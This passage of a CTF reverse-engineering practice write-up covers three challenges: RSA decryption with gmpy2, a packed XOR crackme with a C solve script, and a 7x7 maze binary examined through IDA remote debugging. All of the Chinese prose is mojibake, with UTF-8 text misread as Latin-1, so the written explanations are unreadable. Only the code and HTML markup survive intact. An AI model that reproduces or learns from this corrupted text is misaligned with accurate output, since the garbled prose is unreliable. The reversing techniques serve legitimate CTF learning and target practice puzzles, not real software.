¹æ®è§£å¯†è¿‡ç¨‹, æˆ‘ä»¬å…ˆæŠŠ N åˆ†è§£æˆ p q , å¯ä»¥å»åœ¨çº¿åˆ†è§£.<img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200503095605681-1590490490248-1591162483535.png" alt="image-20200503095605681-1590490490248"></p><p>ç„¶åä½¿ç”¨ pythonçš„gmpy2åº“å…ˆæ±‚é€†å…ƒå¾—åˆ°<strong>D</strong>. æœ€åç”¨  <strong>M ï¼C ^D mod N</strong>  è§£å¯†å¹¶ä»16è¿›åˆ¶è½¬åŒ–ä¸ºå­—ç¬¦. è¿™ä¸ªgmpy2çš„åº“çš„å®‰è£…è¿˜è´¹äº†äº›æ—¶é—´..ğŸ¤£ <strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p = <span class="number">282164587459512124844245113950593348271</span></span><br><span class="line">q = <span class="number">366669102002966856876605669837014229419</span></span><br><span class="line">N = <span class="number">103461035900816914121390101299049044413950405173712170434161686539878160984549</span></span><br><span class="line">c = <span class="number">0xad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(e, (p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line">m = gmpy2.powmod(c, d, p*q)</span><br><span class="line"></span><br><span class="line">print(bytes.fromhex(hex(m)[<span class="number">2</span>:])</span><br></pre></td></tr></table></figure><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200503101307822-1590490496701-1591162599070.png" alt="image-20200503101307822-1590490496701"></p><p><strong>æ€»ç»“: (1)å¯¹rsaæœ‰äº†åˆæ­¥çš„äº†è§£, å­¦ä¼šäº†ç®€å•çš„åŠ å¯†è§£å¯†æ–¹æ³•. (2)GMPç®—æ•°åº“çš„è®¤è¯†. (3)å­—ç¬¦çš„ASCIIè½¬16è¿›åˆ¶çš„ç®€æ´ç®—æ³•.</strong></p><h3 id="BabyXor"><a href="#BabyXor" class="headerlink" title="BabyXor"></a>BabyXor</h3><p>é¦–å…ˆ, æ˜æ˜å¯ä»¥ç›´æ¥ODåŠ¨æ€è°ƒè¯•, å¾ˆå¿«å¾—åˆ°flag.  ä½†æ˜¯æˆ‘ç”¨idaæŠŠé¢˜åšå®Œ, æ‰ä¸€ä¸‹å­æƒ³èµ·.ğŸ¤£</p><p>å‘ç°æœ‰å£³, è½½å…¥ODä½¿ç”¨å †æ ˆå¹³è¡¡è„±å£³. è½½å…¥ida, å‘ç°mainå‡½æ•°é‡Œæœ‰å¾ˆå¤šå‡½æ•°, ä¸Šä¸‹åˆ†æäº†ä¸‹, å‘ç°éƒ½æ˜¯å¹²æ‰°çš„å‡½æ•°. <img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200503173759296-1590490519677-1591162520630.png" alt="image-20200503173759296-1590490519677"></p><p>ç¡®å®šç›®æ ‡, å°±æ˜¯é€šè¿‡è¿™å‡ ä¸ªå‡½æ•°ä»ç¼–ç çš„æ•°æ®ä¸­å–å‡ºå­—ç¬¦ç»è¿‡ä¸€äº›ç®€å•çš„å¼‚æˆ–è¿ç®—, å­˜æ”¾å†ä¸€ä¸ªå†…å­˜ç©ºé—´. ä½†æ˜¯ä¸æˆ‘ä»¬è¾“å…¥æ•°æ®æ²¡æœ‰å…³ç³». (è¿™æ—¶å€™, å°±å¯ä»¥ç›´æ¥å–ODåŠ¨æ€è°ƒè¯•ç›´æ¥å¾—åˆ°flagçš„, å”‰, æˆ‘ç®—å‡ºæ¥æ‰æƒ³èµ·)</p><p>ä¸€ä¸ªç–‘é—®çš„åœ°æ–¹<img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200503174247305-1590490527077-1591162527371.png" alt="image-20200503174247305-1590490527077"></p><p>ç„¶åçœ‹äº†çœ‹æ±‡ç¼–ä»£ç . è¿˜æ˜¯ä¸æ¸…æ¥š.  <img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200503174332262-1590490532558-1591162533239.png" alt="image-20200503174332262-1590490532558"></p><p>è¿›å»ODè°ƒè¯•çœ‹çœ‹.å‘ç°ä»£ç åˆæ˜¯ä¸€ä¸ªæ ·. ä¸è¿‡è¿™ä¸‹å°±æ¸…æ¥šäº†. å…ˆå–åœ°å€çš„å€¼. <strong>è®°ä½è¿™ç‚¹</strong><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200503174534451-1590490539636-1591162540789.png" alt="image-20200503174534451-1590490539636"></p><p>è§£é¢˜è„šæœ¬ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">union</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ida_chars[<span class="number">56</span>];</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">14</span>];</span><br><span class="line">&#125;A = &#123;</span><br><span class="line">  <span class="number">102</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">109</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">99</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">100</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">127</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">55</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">53</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">48</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">48</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">107</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">58</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">60</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">59</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">32</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">union</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ida[<span class="number">56</span>];</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">14</span>];</span><br><span class="line">&#125; B = &#123;</span><br><span class="line">   <span class="number">55</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">111</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">56</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">98</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">54</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">  <span class="number">124</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">55</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">51</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">52</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">118</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">51</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">98</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">100</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>, <span class="number">122</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">union</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ida_[<span class="number">56</span>];</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">14</span>];</span><br><span class="line">&#125;C = &#123;</span><br><span class="line">   <span class="number">26</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">81</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">5</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">17</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">84</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">86</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">85</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">89</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">29</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">9</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">93</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">18</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span></span><br><span class="line">&#125;; </span><br><span class="line"><span class="keyword">char</span> f1[<span class="number">14</span>] = &#123;<span class="number">0</span>&#125;, f2[<span class="number">14</span>] = &#123;<span class="number">0</span>&#125;, f3[<span class="number">14</span>] = &#123;<span class="number">0</span>&#125;, ftemp[<span class="number">14</span>] = &#123;<span class="number">0</span>&#125;, temp = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">14</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">f1[i] = A.a[i] ^ i; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f2[<span class="number">0</span>] = B.a[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">1</span>; i &lt; <span class="number">14</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">f2[i] = A.a[i] ^ B.a[i] ^ A.a[i<span class="number">-1</span>]; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">13</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">temp = C.a[i+<span class="number">1</span>] ^ f2[i]; </span><br><span class="line">ftemp[i] = temp ^ i;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f3[<span class="number">0</span>] = <span class="number">0x2D</span>;</span><br><span class="line"><span class="built_in">strcat</span>(f3, ftemp);</span><br><span class="line"></span><br><span class="line"><span class="built_in">strcat</span>(flag, f1);</span><br><span class="line"><span class="built_in">strcat</span>(flag, f2);</span><br><span class="line"><span class="built_in">strcat</span>(flag, f3);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(flag); </span><br><span class="line"></span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200503174824411-1590490553835-1591162556782.png" alt="image-20200503174824411-1590490553835"></p><p>ä¸‹é¢è¯´ä¸€æ­¥åˆ°ä½.æ‰¾åˆ°æœ€åä¸€ä¸ªå‡½æ•°æœ€åèµ‹å€¼ä»£ç çš„åœ°å€. å¤åˆ¶ä¸‹æ¥<img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200503175027583-1590490558591-1591162567556.png" alt="image-20200503175027583-1590490558591"></p><p>è¿›å»OD, è·³åˆ°è¿™ä¸ªåœ°å€ä¸‹æ–­ç‚¹, è¿è¡Œèµ·æ¥. çœ‹æ•°æ®çª—å£. <img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200503175154926-1590490566331-1591162575032.png" alt="image-20200503175154926-1590490566331"></p><p><strong>æ€»ç»“: (1)æ³¨æ„è¿™ç§flagå’Œè¾“å…¥å­—ç¬¦æ— å…³çš„çš„é¢˜. (2)è¿™é‡Œ idaä¸­çš„å†…å­˜å–å€¼ä¸ODä¸­çš„å·®å¼‚.</strong></p><h3 id="easy-Maze"><a href="#easy-Maze" class="headerlink" title="easy_Maze"></a>easy_Maze</h3><p>è¿™é“é¢˜å¯¹æ–°æ‰‹è¿˜æ˜¯å¾ˆå¥½. </p><p>ç”±é¢˜ç›®æˆ‘ä»¬èƒ½çŸ¥é“æ˜¯å…³äºè¿·å®«çš„é¢˜. ä¸‹è½½ä¸‹æ¥æ˜¯elfæ–‡ä»¶, æŸ¥å£³åæ— å£³, åœ¨linuxä¸‹è¿è¡Œçœ‹çœ‹å¤§æ¦‚æµç¨‹. </p><p>è½½å…¥IDA, å…ˆåˆ†æäº†æ¥å—æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦çš„å‡½æ•°.  çŸ¥é“åœ¨å¤–é¢ä¸€å±‚çš„ä¸»å‡½æ•°æ˜¯å…ˆç”Ÿæˆä¸€ä¸ªæ¯è¡Œ7ä¸ªå…ƒç´ çš„æ•°ç»„. ç„¶åé€šè¿‡æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦æŒ‰æ§åˆ¶åœ¨çŸ©é˜µè¿·å®«ä¸­èµ°å‘, æœ€åæŒ‰ç…§è§„å®šçš„åˆ°è¾¾ä¸€ä¸ªç›®çš„åœ°.<img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200504133456542-1592290152904.png" alt="image-20200504133456542"></p><p>æ¥ä¸‹æ¥è¿”å›å¤–ä¾§çš„ä¸»å‡½æ•°, å°±æ˜¯ç”ŸæˆçŸ©é˜µçš„äº†. é€šè¿‡ä¸Šé¢çš„49ä¸ªå…ƒç´ çŸ¥é“ä¸”ä¸‹é¢å‡½æ•°çš„å‚æ•°7, çŸ¥é“è§„æ¨¡ 7*7. <img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200504133948097-1592290160103.png" alt="image-20200504133948097"></p><p>è¿›å…¥<strong>Step_0</strong> çœ‹çœ‹. å°±æ˜¯ç®€å•çš„æŠŠä¸Šé¢49ä¸ªå…ƒç´ èµ‹å€¼ç»™ v7 æ•°ç»„, ä¹Ÿå°è¯äº†æ•°ç»„æ˜¯7*7</p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200506194728611-1592290641234.png" alt="image-20200506194728611"></p><p>æ¥ä¸‹æ¥ <strong>Step_1</strong>, çœ‹èµ·æ¥æ˜¯å¾ˆç®€æ´, ä½†é‡Œé¢çš„ <strong>getA</strong>ä¸ <strong>getAstart</strong> å‡½æ•° ç®—æ³•å¤ªå†—é•¿äº†.</p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200506195403856-1592290472100.png" alt="image-20200506195403856"></p><p>è¿™ä¸ªæ—¶å€™, å¼€å§‹æˆ‘å°±æŠŠç”ŸæˆçŸ©é˜µçš„æ‰€æœ‰å‡½æ•°åŠæ•°æ®éƒ½å¤åˆ¶åˆ°<strong>VC</strong> ç¼–è¯‘å™¨ä¸­, å†æ ¹æ®æ ˆçš„ç‰¹ç‚¹æ”¹ä¸‹æ•°æ®çš„é¡ºåº(<strong>æ•°æ®å­˜æ”¾æ˜¯ä»ä¸‹å¾€ä¸Š, é‚£ä¹ˆæˆ‘ä»¬å–æ•°æ®æ—¶åœ°å€æ¯æ¬¡å‡1è€Œä¸æ˜¯åŠ ä¸€</strong>), ç„¶åè¿è¡Œæ‰“å°å‡ºçŸ©é˜µ. é—®é¢˜æ˜¯è¿è¡Œåä»€ä¹ˆä¹Ÿæ²¡æœ‰æ‰“å°, è°ƒè¯•å‘ç°ä¸€ä¸ªå‡½æ•°ä¸­çš„å†…å­˜ç©ºé—´å’Œå¦å¤–ä¸€ä¸ªå†²çª, ç›¸äº’è¦†ç›–å€¼. è¿™ä¸ªå‡½æ•°å¤ªå¤š,å…³è”æ€§å¤§, æ”¹èµ·æ¥ä¹Ÿéº»çƒ¦.</p><p>ç„¶åè½¬å‘GDBè°ƒè¯•, ä½†æ˜¯ä¸ç†Ÿç»ƒ. åˆè½¬å‘idaåŠ¨æ€è°ƒè¯•. é¦–å…ˆ<strong>åœ¨ IDA çš„å®‰è£…ç›®å½•/dbgsrc/æ‰¾åˆ° linux_server å’Œ linux_server64 æ‹·è´åˆ° linux</strong> ,åœ¨linuxä¸­è¿è¡Œ <strong>linux_server64</strong>, ç„¶ååœ¨Debuggerçš„ process options å¦‚ä¸‹å›¾æ ¼å¼é…ç½®. ç„¶åF9å¼€å§‹.</p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200506202545180-1592290263125.png" alt="image-20200506202545180"></p><p>å…ˆä¸‹æ–­ç‚¹, æ‰¾åˆ°å‚¨å­˜çŸ©é˜µçš„ç©ºé—´çš„åœ°å€, æŠŠè¿™ä¸ªåœ°å€è½¬åˆ°æ•°æ®çª—å£è·Ÿéš, ç„¶åè¿è¡Œåˆ°ç”ŸæˆçŸ©é˜µçš„ä¸‹é¢ä¸€ä¸ªå‡½æ•°(ä¹Ÿå°±æ˜¯(<strong>Step_1</strong>ä¸‹é¢). åœ¨æ•°æ®çª—å£å‡ºç°æˆ‘ä»¬çš„æ•°æ®(intå‹), ç”±äºæ˜¯49ä¸ªå…ƒç´ , 49*4/16 = 12 â€¦4  ,é‚£å°±æ˜¯12è¡ŒåŠ 4ä¸ªæ•°æ®, <strong>shift+E</strong>æå–å‡ºCè¯­è¨€æ ¼å¼çš„æ•°æ®.<img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200504135411101-1592290168306.png" alt="image-20200504135411101"></p><p>æ•°æ®å¾—åˆ°å, ç”¨Cè¯­è¨€æ‰“å°å‡ºæ¥å¥½è§‚å¯Ÿ, æ³¨æ„æ¯ä¸ªæ•°æ®4ä¸ªå­—èŠ‚(å°ç«¯). </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">union</span> <span class="comment">//æ¯ä¸ªæ•°æ®4ä¸ªå­—èŠ‚, ä¸”å°ç«¯. ç”¨è”åˆ</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ida_chars[<span class="number">196</span>];</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">49</span>];</span><br><span class="line">&#125;A = &#123;</span><br><span class="line">    <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> (*p)[<span class="number">7</span>] = (<span class="keyword">int</span> (*)[<span class="number">7</span>])A.a;  <span class="comment">// å¼ºåˆ¶è½¬åŒ–ä¸ºæ•°ç»„æŒ‡é’ˆ, æ–¹ä¾¿åé¢æ‰“å°</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">7</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d "</span>, p[i][j]);</span><br><span class="line">&#125; </span><br><span class="line"><span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img 